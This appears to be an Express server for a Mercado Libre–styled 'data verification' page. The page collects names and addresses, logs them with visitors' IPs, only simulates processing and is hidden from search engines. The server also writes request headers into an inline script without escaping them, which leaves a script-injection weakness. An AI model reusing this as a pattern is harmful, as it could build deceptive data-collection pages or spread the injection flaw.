import express from 'express';
import compression from 'compression';
import helmet from 'helmet';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3002;

// Middleware de seguridad
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://www.google.com",
        "https://www.gstatic.com"
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://www.google.com"],
      frameSrc: ["'self'", "https://www.google.com"],
    },
  },
  crossOriginEmbedderPolicy: false,
}));

// Middleware de compresión
app.use(compression());

// Middleware para parsear JSON
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Middleware para servir archivos estáticos
app.use(express.static(path.join(__dirname, '../dist'), {
  maxAge: '1y',
  etag: true,
  lastModified: true,
}));

// Middleware para CORS
app.use((req, res, next) => {
  const allowedOrigins = process.env.VITE_ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'];
  const origin = req.headers.origin;
  
  if (origin && allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
  }
  
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Función para detectar idioma basado en el dominio
function detectLanguage(req: express.Request): string {
  const host = req.get('host') || '';
  const referer = req.get('referer') || '';
  
  // Detectar por dominio
  if (host.includes('mercadolibre.com.ar') || referer.includes('mercadolibre.com.ar')) {
    return 'es-AR';
  }
  
  if (host.includes('mercadolivre.com.br') || referer.includes('mercadolivre.com.br')) {
    return 'pt-BR';
  }
  
  // Detectar por query parameter
  const lang = req.query.lang as string;
  if (lang && ['es-AR', 'pt-BR'].includes(lang)) {
    return lang;
  }
  
  // Detectar por Accept-Language header
  const acceptLanguage = req.get('Accept-Language') || '';
  if (acceptLanguage.includes('pt')) {
    return 'pt-BR';
  }
  
  // Default a español
  return 'es-AR';
}

// API endpoint para obtener países
app.get('/api/countries', async (req, res) => {
  try {
    // Simular latencia de API
    await new Promise(resolve => setTimeout(resolve, 500));
    
    const countries = [
      { id: 'AR', name: 'Argentina', code: 'AR', flag: '🇦🇷' },
      { id: 'BR', name: 'Brasil', code: 'BR', flag: '🇧🇷' },
      { id: 'MX', name: 'México', code: 'MX', flag: '🇲🇽' },
      { id: 'CO', name: 'Colombia', code: 'CO', flag: '🇨🇴' },
      { id: 'CL', name: 'Chile', code: 'CL', flag: '🇨🇱' },
      { id: 'PE', name: 'Perú', code: 'PE', flag: '🇵🇪' },
      { id: 'UY', name: 'Uruguay', code: 'UY', flag: '🇺🇾' },
      { id: 'PY', name: 'Paraguay', code: 'PY', flag: '🇵🇾' },
      { id: 'BO', name: 'Bolivia', code: 'BO', flag: '🇧🇴' },
      { id: 'EC', name: 'Ecuador', code: 'EC', flag: '🇪🇨' },
    ];
    
    res.json({
      success: true,
      data: countries,
    });
    
  } catch (error) {
    console.error('Countries API Error:', error);
    
    res.status(500).json({
      success: false,
      message: 'Error al obtener países',
    });
  }
});

// API endpoint para verificación
app.post('/api/verification/submit', async (req, res) => {
  try {
    const { name, country, address, captchaToken } = req.body;
    
    // Validar datos requeridos
    if (!name || !country || !address || !captchaToken) {
      return res.status(400).json({
        success: false,
        message: 'Faltan datos requeridos',
        errors: ['name', 'country', 'address', 'captchaToken'].filter(field => !req.body[field]),
      });
    }
    
    // Simular procesamiento
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    console.log('Verification submitted:', { name, country, address, ip: req.ip });
    
    res.json({
      success: true,
      message: 'Verificación completada exitosamente',
      data: {
        id: `verification_${Date.now()}`,
        timestamp: new Date().toISOString(),
      },
    });
    
  } catch (error) {
    console.error('Verification API Error:', error);
    
    res.status(500).json({
      success: false,
      message: 'Error interno del servidor',
    });
  }
});

// Ruta principal - servir el archivo HTML estático (DEBE IR AL FINAL)
app.get('*', (req, res) => {
  const locale = detectLanguage(req);
  
  // Datos iniciales
  const initialData = {
    locale,
    referrer: req.get('referer'),
    userAgent: req.get('User-Agent'),
    ip: req.ip,
    timestamp: new Date().toISOString(),
  };
  
  // Configuración de performance
  const performanceConfig = {
    CAPTCHA_LOAD_TIMEOUT: parseInt(process.env.CAPTCHA_LOAD_TIMEOUT || '10000'),
    FORM_SUBMIT_TIMEOUT: parseInt(process.env.FORM_SUBMIT_TIMEOUT || '30000'),
    API_TIMEOUT: parseInt(process.env.API_TIMEOUT || '8000'),
    RENDER_TIMEOUT: parseInt(process.env.RENDER_TIMEOUT || '5000'),
  };
  
  // Enviar respuesta HTML
  res.status(200).send(`
    <!DOCTYPE html>
    <html lang="${locale}">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Verificación de datos de usuario" />
        <meta name="robots" content="noindex, nofollow" />
        <title>Verificación de Datos</title>
        <link rel="preconnect" href="https://www.google.com" />
        <link rel="dns-prefetch" href="https://www.gstatic.com" />
        <style>
          /* Estilos críticos para no-script */
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; margin: 0; padding: 0; }
          .noscript-fallback { display: none; }
          .noscript-fallback.noscript-active { display: block; }
          .js-fallback { display: block; }
          .js-fallback.js-active { display: none; }
        </style>
        <script>
          window.__INITIAL_DATA__ = ${JSON.stringify(initialData)};
          window.__PERFORMANCE_CONFIG__ = ${JSON.stringify(performanceConfig)};
        </script>
      </head>
      <body>
        <noscript>
          <div class="noscript-fallback noscript-active">
            <div style="min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);">
              <div style="max-width: 32rem; width: 100%; background: white; border-radius: 0.5rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); overflow: hidden;">
                <div style="padding: 2rem 2rem 1rem 2rem; text-align: center; border-bottom: 1px solid #e5e7eb;">
                  <h1 style="margin: 0 0 0.5rem 0; font-size: 1.5rem; font-weight: 700; color: #111827;">
                    ${locale.startsWith('es') ? 'Verificación de Datos' : 'Verificação de Dados'}
                  </h1>
                  <p style="margin: 0; font-size: 1rem; color: #6b7280;">
                    ${locale.startsWith('es') 
                      ? 'Por favor, completa la información solicitada para continuar con la verificación.'
                      : 'Por favor, complete as informações solicitadas para continuar com a verificação.'
                    }
                  </p>
                </div>
                <div style="padding: 2rem; text-align: center;">
                  <p style="margin: 0 0 1rem 0; font-size: 1rem; color: #6b7280;">
                    ${locale.startsWith('es') 
                      ? 'Para continuar, habilita JavaScript en tu navegador para completar la verificación de seguridad.'
                      : 'Para continuar, habilite JavaScript no seu navegador para completar a verificação de segurança.'
                    }
                  </p>
                  <button onclick="window.location.reload()" style="padding: 0.75rem 2rem; font-size: 1rem; font-weight: 500; color: white; background: #3483fa; border: none; border-radius: 0.375rem; cursor: pointer;">
                    ${locale.startsWith('es') ? 'Recargar Página' : 'Recarregar Página'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </noscript>
        
        <div id="root" class="js-fallback">
          <div style="min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);">
            <div style="text-align: center;">
              <div style="width: 40px; height: 40px; border: 4px solid #e5e7eb; border-top: 4px solid #3483fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem auto;"></div>
              <p style="margin: 0; font-size: 1rem; color: #6b7280;">
                ${locale.startsWith('es') ? 'Cargando aplicación...' : 'Carregando aplicação...'}
              </p>
            </div>
          </div>
        </div>
        
        <script type="module" src="/assets/main-FeQ2Zsmk.js"></script>
        <style>
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        </style>
      </body>
    </html>
  `);
});


// Manejo de errores global
app.use((error: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {
  console.error('Express Error:', error);
  
  res.status(500).json({
    success: false,
    message: 'Error interno del servidor',
  });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`🚀 Server started on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🌐 Access: http://localhost:${PORT}`);
});

export default app;
